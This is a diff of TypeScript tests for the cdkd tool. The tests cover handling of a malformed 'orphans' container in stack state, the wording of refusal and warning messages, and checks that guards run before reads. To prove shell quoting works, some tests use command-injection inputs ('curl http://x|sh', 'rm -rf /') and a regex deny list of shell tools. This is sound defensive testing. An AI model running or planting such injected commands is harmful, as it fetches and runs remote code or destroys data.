@@ -29,6 +29,12 @@ import {
   malformedResourcesWarning,
   malformedStateRefusalMessage,
   refuseMalformedNestedChildOutputs,
+  hasReadableOrphans,
+  malformedDestroyOrphansRefusalMessage,
+  malformedOrphansRefusalMessage,
+  malformedOrphansWarning,
+  refuseMalformedOrphans,
+  refuseMalformedOrphansForDestroy,
   refuseMalformedOutputs,
   refuseMalformedOutputsForDestroy,
   refuseMalformedResourceEntries,
@@ -37,6 +43,7 @@ import {
   refuseMalformedResourcesForDeploy,
   refuseMalformedResourcesForDestroy,
   refuseMalformedState,
+  repairMalformedOrphansForReadOnly,
   repairMalformedOutputsForReadOnly,
   repairMalformedResourceEntriesForReadOnly,
   repairMalformedResourcePropertiesForReadOnly,
@@ -53,6 +60,9 @@ import {
   displaySafe,
   truncateCodePoints,
 } from '../../../src/utils/display-safe.js';
+// For the "offers no destructive command" invariant below: the command names are
+// DERIVED from the real Commander tree, never hand-listed.
+import { buildProgram } from '../../../src/cli/program.js';
 
 /**
  * What the module's private `safeIdentifier` would render a name as, before
@@ -417,6 +427,226 @@ describe('repairMalformedResourceEntriesForReadOnly', () => {
     const s = state(bag);
     expect(repairMalformedResourceEntriesForReadOnly(s)).toEqual([]);
     expect(s.resources).toBe(bag);
+  });
+});
+
+describe('the orphans CONTAINER (issue go-to-k/cdkd#3379)', () => {
+  const withOrphans = (orphans: unknown): StackState =>
+    ({ ...state({}), orphans }) as unknown as StackState;
+  // Every shape `parseStateBody` lets through. `{"length": 1}` is here because
+  // a `.length`-keyed guard ACCEPTS it while every reader that walks the
+  // container still fails — the shape that separates the two tests.
+  const UNREADABLE: Array<[string, unknown]> = [
+    ['a string', 'abc'],
+    ['a number', 5],
+    ['a plain object', {}],
+    ['an object carrying length', { length: 1 }],
+    ['null', null],
+    ['a boolean', true],
+  ];
+
+  describe('hasReadableOrphans', () => {
+    it.each(UNREADABLE)('rejects %s', (_label, value) => {
+      expect(hasReadableOrphans(withOrphans(value))).toBe(false);
+    });
+
+    it('accepts a list, empty or not', () => {
+      expect(hasReadableOrphans(withOrphans([]))).toBe(true);
+      expect(hasReadableOrphans(withOrphans([{ logicalId: 'A' }]))).toBe(true);
+    });
+
+    it('accepts an ABSENT container, which is the ordinary record', () => {
+      // A stack that never had a failed deploy has no orphan list at all, and
+      // `JSON.stringify` drops the key when it is undefined — so warning here
+      // would fire on almost every record in a bucket.
+      expect(hasReadableOrphans(state({}))).toBe(true);
+      expect(hasReadableOrphans(withOrphans(undefined))).toBe(true);
+    });
+
+    it('says nothing about the ENTRIES, which are go-to-k/cdkd#3344 question', () => {
+      // The container is a list; its rows are not this predicate's business.
+      expect(hasReadableOrphans(withOrphans([null, 'x', 5]))).toBe(true);
+    });
+  });
+
+  describe('repairMalformedOrphansForReadOnly', () => {
+    it.each(UNREADABLE)('replaces %s with an empty list and reports it', (_label, value) => {
+      const s = withOrphans(value);
+      expect(repairMalformedOrphansForReadOnly(s)).toBe(true);
+      expect(s.orphans).toEqual([]);
+    });
+
+    it('leaves a readable container untouched and reports nothing', () => {
+      const records = [{ logicalId: 'A' }] as unknown as StackState['orphans'];
+      const s = withOrphans(records);
+      expect(repairMalformedOrphansForReadOnly(s)).toBe(false);
+      expect(s.orphans).toBe(records);
+      const absent = state({});
+      expect(repairMalformedOrphansForReadOnly(absent)).toBe(false);
+      // Absent stays ABSENT rather than becoming `[]`: materializing the key
+      // would be a change `cdkd scrub`'s write gate could then persist.
+      expect('orphans' in absent).toBe(false);
+    });
+  });
+
+  describe('refuseMalformedOrphans', () => {
+    it.each(UNREADABLE)('refuses %s, naming the container', (_label, value) => {
+      let thrown: unknown;
+      try {
+        refuseMalformedOrphans(withOrphans(value), 'MyStack', 'us-east-1');
+      } catch (err) {
+        thrown = err;
+      }
+      expect(thrown).toBeInstanceOf(CdkdError);
+      expect((thrown as CdkdError).code).toBe(STATE_RESOURCES_MALFORMED);
+      // The CONTAINER by name: a `resources` message over an intact resource
+      // map tells the reader not to run `cdkd deploy` for a reason that does
+      // not hold.
+      expect((thrown as CdkdError).message).toContain("'orphans'");
+      expect((thrown as CdkdError).message).not.toContain("'resources' map");
+    });
+
+    it('passes a readable or absent container', () => {
+      expect(() => refuseMalformedOrphans(withOrphans([]), 'S', 'r')).not.toThrow();
+      expect(() => refuseMalformedOrphans(state({}), 'S', 'r')).not.toThrow();
+    });
+  });
+
+  describe('the two texts', () => {
+    it('name the stack, the region and the inspect command, which goes LAST', () => {
+      for (const message of [
+        malformedOrphansWarning('MyStack', 'us-east-1'),
+        malformedOrphansRefusalMessage('MyStack', 'us-east-1'),
+      ]) {
+        expect(message).toContain('MyStack');
+        expect(message).toContain('us-east-1');
+        // `shellQuote` leaves a name needing no quoting unquoted; what this
+        // pins is that the pasteable command ENDS the message, unwrapped.
+        expect(
+          message.endsWith('cdkd state show MyStack --stack-region us-east-1 --json'),
+          message
+        ).toBe(true);
+      }
+    });
+
+    it('shell-quote a hostile identity and stay on one line', () => {
+      const evil = "a'; curl http://x|sh; echo '";
+      for (const message of [
+        malformedOrphansWarning(evil, 'us-east-1'),
+        malformedOrphansRefusalMessage(evil, 'us-east-1'),
+      ]) {
+        // Quoted, not merely present: the raw name followed by the next flag is
+        // what a paste would execute.
+        expect(message).not.toContain(`${evil} --stack-region`);
+        expect(message.split('\n')).toHaveLength(1);
+      }
+      expect(malformedOrphansWarning(String.fromCharCode(0x00), 'r')).toContain(UNRENDERABLE);
+    });
+
+    it('the WRITER text names the hand-edit hazard and invokes only the READ command', () => {
+      // Security review of the go-to-k/cdkd#3379 maintainer round: the first cut
+      // of this clause said the record "stays damaged until you rewrite or
+      // remove it yourself", which reads as "cdkd offers nothing" and steers an
+      // operator to edit the object in S3 — where rewriting the container to
+      // `[]` erases the evidence this refusal exists to protect, bypassing the
+      // lock and the If-Match on every supported write. So the clause names
+      // that hazard rather than leaving the reader to find it.
+      const m = malformedOrphansRefusalMessage('MyStack', 'us-east-1');
+      expect(m).toContain('no cdkd command repairs this container');
+      // The WARNING, not just the notation: keying on `[]` alone left the
+      // consequence clause deletable with every assertion green (maintainer
+      // proxy pass, round 2).
+      expect(m, 'the hand-edit hazard is not named').toContain('[]');
+      expect(m).toContain('discards the very evidence this refusal is protecting');
+      // And it offers NO command that deletes — asserted as the INVARIANT
+      // rather than as one spelling, because excluding `cdkd state orphan`
+      // alone left an inserted `aws s3 rm` green. Exactly one command-shaped
+      // token, and it is the read below. A removal route belongs to the DESTROY
+      // sibling, which owes it because it is refusing a cleanup; here a
+      // deleting command would need this message to gain that sibling's
+      // exactness split, since a sanitized name can match a HEALTHY record.
+      // DERIVED from the CLI's own command inventory, whitespace-normalised, and
+      // asserted as the WHOLE list rather than per spelling. Three weaker cuts
+      // were each green under a mutation (maintainer proxy pass): excluding only
+      // `cdkd state orphan` admitted `aws s3 rm`; a hand list of subcommands
+      // admitted `cdkd gc`; and a `toContain` check admitted `cdkd  state
+      // orphan` with two spaces, as well as a SECOND copy of the allowed read.
+      // The floors are what stop a broken import from making this vacuous.
+      const program = buildProgram();
+      const topLevel = program.commands.map((c) => c.name());
+      const stateSubs = (program.commands.find((c) => c.name() === 'state')?.commands ?? []).map(
+        (c) => c.name()
+      );
+      expect(topLevel.length).toBeGreaterThan(10);
+      expect(stateSubs.length).toBeGreaterThan(5);
+      // Quotes stripped as well as whitespace collapsed: `cdkd 'state' orphan` executes as
+      // `state orphan`, and a bare-token regex misses it. What this pins is the message's
+      // command inventory under that normalisation — not every conceivable shell spelling,
+      // which no string assertion can reach.
+      const flat = m.replace(/['"]/g, '').replace(/\s+/g, ' ');
+      const invoked = [...flat.matchAll(/cdkd\s+([a-z][a-z-]*)(?:\s+([a-z][a-z-]*))?/g)]
+        .filter((hit) => topLevel.includes(hit[1]!))
+        .map((hit) => (hit[1] === 'state' ? `state ${hit[2]}` : hit[1]!));
+      expect(invoked, 'the refusal invokes a command other than the one READ').toEqual([
+        'state show',
+      ]);
+      // ...and no foreign tool either, which is the other half of "offers no
+      // destructive command" (an inserted `aws s3 rm` was green before this).
+      expect(flat).not.toMatch(/\b(?:aws|rm|curl|kubectl|sh)\s+\S/);
+      // The one PASTEABLE command still ends the message, unwrapped, so the
+      // added sentence did not move it off the tail.
+      expect(m.endsWith('cdkd state show MyStack --stack-region us-east-1 --json')).toBe(true);
+      expect(m.split('\n')).toHaveLength(1);
+    });
+
+    it('the DESTROY text says what a destroy does, and names the way out', () => {
+      const destroy = malformedDestroyOrphansRefusalMessage('MyStack', 'us-east-1');
+      // A destroy writes nothing back, so the write-back mechanism the other
+      // refusal describes would be a false sentence here.
+      expect(destroy).not.toContain('written back');
+      expect(destroy).toContain('DELETES state');
+      // And it answers "then how do I get rid of the record?", which the
+      // sibling destroy refusal answers the same way. `cdkd state orphan`
+      // reads no orphans container, so the pointer is sound.
+      expect(destroy).toContain('cdkd state orphan');
+      // It also owes what every other message in this module ends ON: how to
+      // READ the record it is refusing. The first cut dropped it, and the
+      // second put it MID-SENTENCE, one space from the next clause — so a
+      // line-select paste handed `cdkd state show` six junk positional
+      // arguments. `endsWith`, not `toContain`, is what pins the placement.
+      expect(destroy.endsWith('cdkd state show MyStack --stack-region us-east-1 --json')).toBe(
+        true
+      );
+      // ...and the sibling's legacy-record clause, because for such a record
+      // the `--stack-region` flag must be OMITTED or it selects nothing.
+      expect(destroy).toContain('legacy record');
+      expect(destroy.split('\n')).toHaveLength(1);
+    });
+
+    it('the DESTROY text withholds the target when the identity does not render exactly', () => {
+      // The same split `malformedDestroyResourcesRefusalMessage` makes: a
+      // sanitized name may match a HEALTHY sibling record, so a command built
+      // from it would send the operator to delete the wrong one.
+      // A name sanitizing CHANGES — an ESC here. A quoted-but-faithful name
+      // (`a'; rm -rf /; #`) renders exactly and keeps the target, which is the
+      // sibling's behaviour too.
+      const withheld = malformedDestroyOrphansRefusalMessage(`a${String.fromCharCode(0x1b)}b`, 'us-east-1');
+      expect(withheld).not.toContain('cdkd state orphan <stack>');
+      expect(withheld).toContain('cdkd state list --long');
+      expect(withheld.split('\n')).toHaveLength(1);
+      // It reads as a SENTENCE: the no-identity clause ends open, so a second
+      // sentence bolted onto it renders with no verb — on the arm a planted
+      // identity reaches.
+      expect(withheld.startsWith('The state record this command loaded has no readable')).toBe(true);
+    });
+
+    it('differ, because continuing costs something different from refusing', () => {
+      // The module's rule: one text per consequence. A shared text here would
+      // tell a read-only reader that the command "refuses", which it does not.
+      expect(malformedOrphansWarning('S', 'r')).not.toBe(malformedOrphansRefusalMessage('S', 'r'));
+      expect(malformedOrphansWarning('S', 'r')).toContain('Continuing with it EMPTY');
+      expect(malformedOrphansRefusalMessage('S', 'r')).toContain('refuses');
+    });
   });
 });
 
@@ -1988,6 +2218,24 @@ describe('the user-facing text', () => {
       'found fewer than two ScrubStackResult literals after the repair; this fence is ' +
         'asserting nothing'
     ).toBeGreaterThanOrEqual(2);
+    // The same count for the `orphans` container (go-to-k/cdkd#3379): a finding
+    // dropped from ONE literal is lost for the stacks that return through it,
+    // which for this container is a secret-free stack under --dry-run.
+    const perLiteralOrphans = body
+      .split('unverifiableReads:')
+      .slice(1)
+      .map((rest) => {
+        const close = rest.indexOf('};');
+        const literal = close >= 0 ? rest.slice(0, close) : rest;
+        return literal.split('malformedOrphans ? { malformedOrphans }').length - 1;
+      });
+    expect(
+      perLiteralOrphans,
+      `each ScrubStackResult must carry \`malformedOrphans\` exactly once; got ` +
+        `${JSON.stringify(perLiteralOrphans)}. A zero means a stack whose orphans container was ` +
+        `repaired returns through that arm with the finding LOST (go-to-k/cdkd#3379).`
+    ).toEqual(perLiteralOrphans.map(() => 1));
+
     expect(
       perLiteral,
       `each ScrubStackResult returned after the repair must carry \`malformedResources\` ` +
@@ -2046,10 +2294,118 @@ describe('the user-facing text', () => {
         'runs: that branch returns.'
     ).toContain('malformedOutputRecords.length > 0');
     expect(
+      branch,
+      'the malformed-ORPHANS finding is not raised inside the --dry-run branch, so a ' +
+        '--dry-run --fail run over an unreadable orphans container exits 1 through the SILENT ' +
+        'ScrubNeededError instead of naming the container (go-to-k/cdkd#3379).'
+    ).toContain('malformedOrphanRecords.length > 0');
+    expect(
+      branch.indexOf('malformedOrphanRecords.length > 0'),
+      'the orphans finding is raised BELOW `options.fail`, so ScrubNeededError fires first.'
+    ).toBeLessThan(branch.indexOf('if (options.fail)'));
+    expect(
       branch.indexOf('malformedOutputRecords.length > 0'),
       'the outputs finding is raised BELOW `options.fail`, so ScrubNeededError (exit 1, silent) ' +
         'fires first and reports "scrub found a leak" for outputs scrub could not read.'
     ).toBeLessThan(branch.indexOf('if (options.fail)'));
+  });
+});
+
+describe('the orphans container guard DOMINATES each reader (go-to-k/cdkd#3379)', () => {
+  /**
+   * Presence is not the property: the defect this container had was that every
+   * reader reached it unguarded, and a guard written BELOW the first read
+   * protects nothing. So each write-capable file is anchored on the expression
+   * its guard must precede.
+   *
+   * `deploy-engine.ts` is anchored on its first SAVE rather than on a lexical
+   * dereference, and that is the measured exception: `redactStateForPersist`
+   * reads the container higher up the file than the guard, but is reachable
+   * only from the save path below it. Anchoring it lexically would fence a
+   * position the code never executes in that order.
+   */
+  const ANCHORS: Record<string, string> = {
+    'src/deployment/deploy-engine.ts': 'await this.stateBackend.saveState(',
+    'src/cli/commands/destroy-runner.ts': 'state.orphans ?? []',
+    'src/cli/commands/rollback.ts': 'orphansAfterRollback(',
+    'src/cli/commands/scrub.ts': 'state.orphans ?? []',
+    'src/cli/commands/import.ts': 'orphansCarriedFrom(',
+    'src/cli/commands/diff-recursive.ts': 'currentState.orphans?.length',
+  };
+  const SPELLINGS = [
+    'refuseMalformedOrphans(',
+    'refuseMalformedOrphansForDestroy(',
+    'repairMalformedOrphansForReadOnly(',
+    'hasReadableOrphans(',
+  ];
+
+  it.each(Object.keys(ANCHORS))('%s guards above its first container read', (file) => {
+    const src = code(file);
+    const positions = SPELLINGS.map((call) => src.indexOf(call)).filter((at) => at > -1);
+    expect(
+      positions.length,
+      `${file} contains none of the guard spellings this fence knows about, so it would pass ` +
+        `over nothing. Add the spelling to SPELLINGS, or this file stopped guarding.`
+    ).toBeGreaterThan(0);
+    const guardAt = Math.max(...positions);
+    const anchor = ANCHORS[file]!;
+    const anchorAt = src.indexOf(anchor);
+    expect(
+      anchorAt,
+      `${file} no longer contains \`${anchor}\`; this fence's anchor is stale and it is no ` +
+        `longer checking dominance.`
+    ).toBeGreaterThan(-1);
+    expect(
+      guardAt,
+      `${file} reaches \`${anchor}\` BEFORE its orphans guard, so the container is read, ` +
+        `walked or written on a path the guard never covered (go-to-k/cdkd#3379).`
+    ).toBeLessThan(anchorAt);
+  });
+
+  it('names every src file that reads the container, so a new reader cannot join unfenced', () => {
+    // Derived from the tree, never from the list above: a file that starts
+    // reading the container and is not anchored fails here. Read from
+    // COMMENT-STRIPPED code — `orphan-adoption.ts` and `rollback-executor.ts`
+    // name `StackState.orphans` in prose only, and `orphan-rewriter.ts` holds
+    // an unrelated `this.orphans` field — so a prose mention cannot add a file
+    // and, more importantly, cannot excuse one.
+    const listed = spawnSync('git', ['grep', '-l', 'orphans', '--', 'src'], {
+      cwd: repoRoot,
+      encoding: 'utf8',
+    })
+      .stdout.split('\n')
+      .filter(Boolean);
+    expect(listed.length, 'the grep stopped matching; this fence is reading nothing').toBeGreaterThan(5);
+    const readers = listed.filter((file) => {
+      if (file === 'src/state/malformed-resources-bag.ts' || file === 'src/types/state.ts') return false;
+      // `diff.ts` receives the already-repaired state from `loadStateOrEmpty`
+      // rather than loading one, so its read is dominated by that file's guard.
+      if (file === 'src/cli/commands/diff.ts') return false;
+      return /[A-Za-z]*[Ss]tate\.orphans\b|orphansCarriedFrom\(|orphansAfterRollback\(/.test(code(file));
+    });
+    expect([...readers].sort()).toEqual(Object.keys(ANCHORS).sort());
+  });
+
+  it('pins the two exclusions the derivation above makes', () => {
+    // `diff.ts` is excluded because it RECEIVES the repaired state rather than
+    // loading one. The moment it loads state itself the exclusion is wrong, and
+    // a comment cannot notice that.
+    expect(
+      code('src/cli/commands/diff.ts'),
+      'diff.ts now loads state itself, so it owes its own guard rather than inheriting ' +
+        "diff-recursive's repair."
+    ).not.toContain('getState(');
+    // `deploy-engine.ts` is anchored on its first SAVE because its only read
+    // above the guard is `redactStateForPersist`, which is reachable only from
+    // the save path. A second read landing above the guard would break that.
+    const engine = code('src/deployment/deploy-engine.ts');
+    const guardAt = engine.indexOf('refuseMalformedOrphans(');
+    const above = engine.slice(0, guardAt).split(/[A-Za-z]*[Ss]tate\.orphans\b/).length - 1;
+    expect(
+      above,
+      'deploy-engine.ts reads the container above its guard somewhere other than ' +
+        'redactStateForPersist, so the save anchor no longer covers every read.'
+    ).toBe(1);
   });
 });
 
@@ -2259,8 +2615,9 @@ describe('write-capable commands refuse; read-only ones repair', () => {
   ];
 
   /**
-   * The module's refusal entry points partition into exactly four classes: the
-   * `outputs`, `properties` and `resources` containers, and the ENTRY guard.
+   * The module's refusal entry points partition into exactly five classes: the
+   * `outputs`, `properties`, `resources` and `orphans` containers, and the
+   * ENTRY guard.
    *
    * A UNION count alone would stay green through a RE-CLASSIFICATION — an
    * `outputs` refusal renamed into the `resources` family keeps the total
@@ -2273,7 +2630,7 @@ describe('write-capable commands refuse; read-only ones repair', () => {
     const exported = [...moduleSrc.matchAll(/export function (refuseMalformed\w*)\(/g)].map(
       (m) => `${m[1]!}(`
     );
-    expect(exported.length, 'the grep stopped matching; this fence is reading nothing').toBe(9);
+    expect(exported.length, 'the grep stopped matching; this fence is reading nothing').toBe(11);
 
     const outputs = exported.filter((n) => /Outputs\(|Outputs[A-Z]/.test(n));
     const properties = exported.filter((n) => n.includes('ResourceProperties'));
@@ -2282,8 +2639,20 @@ describe('write-capable commands refuse; read-only ones repair', () => {
     // spellings must not treat it as one.
     const entries = exported.filter((n) => n.includes('ResourceEntries'));
     expect(entries).toEqual(['refuseMalformedResourceEntries(']);
+    // The `orphans` CONTAINER (go-to-k/cdkd#3379), its own class for the reason
+    // the entry guard is: it is not a `resources` bag refusal, so a dominance
+    // check keyed on the bag's spellings must not count it as one.
+    // TWO entry points on this container, one predicate — the split is the
+    // MESSAGE, as it is for `outputs`: a destroy writes nothing back, so its
+    // text cannot be the one that says the container would be rewritten.
+    const orphans = exported.filter((n) => n.includes('Orphans'));
+    expect([...orphans].sort()).toEqual([
+      'refuseMalformedOrphans(',
+      'refuseMalformedOrphansForDestroy(',
+    ]);
     const resources = exported.filter(
-      (n) => !outputs.includes(n) && !properties.includes(n) && !entries.includes(n)
+      (n) =>
+        !outputs.includes(n) && !properties.includes(n) && !entries.includes(n) && !orphans.includes(n)
     );
     // Derived from REFUSAL_SPELLINGS rather than re-spelled: a second hard-coded
     // copy of that triple is what drifts when a fourth outputs refusal lands.
@@ -2748,6 +3117,35 @@ describe('write-capable commands refuse; read-only ones repair', () => {
           src,
           'the outputs finding no longer reaches the audited-record refusal.'
         ).toContain('malformedOutputRecords.length > 0');
+        // SCOPED to the builder, and keyed on the SENTENCE rather than on the
+        // identifier: `malformedOrphanRecords.length > 0` also occurs in the
+        // dry-run branch above, so a whole-file `toContain` stays green when
+        // the audited-error arm or its sentence is deleted (measured — this
+        // fence read that way for one round).
+        const builderAt = src.indexOf('function malformedRecordsAuditedError');
+        expect(
+          builderAt,
+          'malformedRecordsAuditedError was renamed; this fence is reading nothing.'
+        ).toBeGreaterThan(-1);
+        const builder = src.slice(builderAt, src.indexOf('\nfunction ', builderAt + 1));
+        expect(
+          builder,
+          'the audited-record refusal no longer has an orphans sentence, so a run that audited ' +
+            'a record with an unreadable orphans container reports it clean.'
+        ).toContain('EMPTY orphan list');
+        expect(
+          builder,
+          'the orphans list is not a parameter of the audited-record refusal, so its sentence ' +
+            'cannot name the records it covers.'
+        ).toContain('orphanStackNames');
+        // ...and both call sites must pass it, or the builder's arm is dead.
+        const callSites = src.split('malformedRecordsAuditedError(').length - 2;
+        expect(callSites, 'the audited-record refusal lost a call site').toBeGreaterThanOrEqual(2);
+        expect(
+          src.split('malformedOrphanRecords\n').length - 1 + src.split('malformedOrphanRecords,').length - 1,
+          'a call site no longer passes the orphans list, so that run reports a clean record it ' +
+            'could not read.'
+        ).toBeGreaterThanOrEqual(callSites);
       }
 
       expect(src, `${file} no longer calls saveState`).toContain('saveState(');
@@ -3020,6 +3418,8 @@ describe('the retried refusals are marked non-retryable (issue #3207)', () => {
     ['destroy resources', () => refuseMalformedResourcesForDestroy(state('abcdef'), 'S', 'us-east-1')],
     ['deploy resources', () => refuseMalformedResourcesForDeploy(state('abcdef'), 'S', 'us-east-1')],
     ['resource properties', () => refuseMalformedResourceProperties(state({ A: { physicalId: 'p', resourceType: 'T', properties: 'x' } }), 'S', 'us-east-1')],
+    ['orphans container', () => refuseMalformedOrphans({ orphans: 'abc' as unknown as StackState['orphans'] }, 'S', 'us-east-1')],
+    ['destroy orphans container', () => refuseMalformedOrphansForDestroy({ orphans: 'abc' as unknown as StackState['orphans'] }, 'S', 'us-east-1')],
   ] as const;
 
   /**
@@ -3056,7 +3456,7 @@ describe('the retried refusals are marked non-retryable (issue #3207)', () => {
     const exported = [...moduleSrc.matchAll(/export function (refuseMalformed\w*)\(/g)].map(
       (m) => `${m[1]!}(`
     );
-    expect(exported.length, 'the grep stopped matching; this fence is reading nothing').toBe(9);
+    expect(exported.length, 'the grep stopped matching; this fence is reading nothing').toBe(11);
     // A refusal is MARKED when its body reaches `markNonRetryable`. Read from
     // the body rather than from the RETRIED table, so the two instruments stay
     // independent — the table proves the marker is SET at runtime, this proves
